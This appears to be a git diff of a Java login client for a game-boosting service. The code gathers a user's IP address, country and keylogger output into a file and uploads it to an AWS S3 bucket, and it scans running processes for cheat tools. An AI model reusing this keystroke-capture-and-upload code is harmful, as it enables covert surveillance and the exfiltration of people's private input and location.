@@ -1,6 +1,5 @@
 package view;
 
-import com.google.gson.JsonObject;
 import controller.LoginController;
 import environment.TaskKiller;
 import javafx.application.Platform;
@@ -77,7 +76,6 @@ public class Loginer extends javafx.application.Application {
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
-                System.out.println("dsadsqa");
                 ArrayList<String> runningProcesses = TaskKiller.requestRunningProccesses();
                 for (String process : runningProcesses) {
                     if(process.contains("BoL Studio.exe") || process.contains("Loader.exe")) {
@@ -102,32 +100,33 @@ public class Loginer extends javafx.application.Application {
     private void uploadLog() {
         try {
             AWSWebService webService =  new AWSWebService();
-            webService.WebService(createLogFile(), createPath());
+            webService.WebService(createLogFile(), createKey());
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
-    private String createPath() {
-        String path = "";
+    private String createKey() {
         DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
-        path += "/" + AWSWebService.folder;
-        path += "/" + LocalDate.now() + "/";
+        String path = "";
+        path += AWSWebService.folder + "/";
+        path += LocalDate.now() + "/";
+        path += createFileName() + ".csv";
         return path;
     }
 
     private File createLogFile() throws IOException {
         File tempFile = File.createTempFile(createFileName(), ".txt");
         BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(tempFile));
-        bufferedWriter.write("The booster's IP adress is: " + getMyIp() + "\n");
-        bufferedWriter.write("The booster's Country is:" + getMyCountry() + "\n");
+        bufferedWriter.write("The booster's IP adress is: " + getMyIp());
+        bufferedWriter.write(System.getProperty("line.separator"));
+        bufferedWriter.write("The booster's Country is:" + getMyCountry());
+        bufferedWriter.write(System.getProperty("line.separator"));
+        bufferedWriter.write(System.getProperty("line.separator"));
         for (String row : KeyLogger.log) {
             bufferedWriter.write(row);
             bufferedWriter.write(System.getProperty("line.separator"));
         }
-        System.out.println(KeyLogger.log);
-        System.out.println(getMyIp());
-        System.out.println(getMyCountry());
         bufferedWriter.close();
 
         return tempFile;
@@ -135,13 +134,14 @@ public class Loginer extends javafx.application.Application {
 
 
     private String createFileName() {
-        String fileName = "ASDASDSADSA";
+        String fileName = "";
         if(foundBadWord) {
-            fileName += "WARNING | ";
+            fileName += " WARNING";
         }
         if (scriptAlert) {
-            fileName += "SCRIPT ALERT | ";
+            fileName += " SCRIPT ALERT ";
         }
+        fileName += "BOOSTER_NAME ORDER_ID";
         return fileName;
     }
 
@@ -179,5 +179,6 @@ public class Loginer extends javafx.application.Application {
         AWSWebService.secretKey = keys.get(1);
         AWSWebService.bucketName = keys.get(2);
         AWSWebService.folder = keys.get(3);
+        AWSWebService.region = keys.get(4);
     }
 }
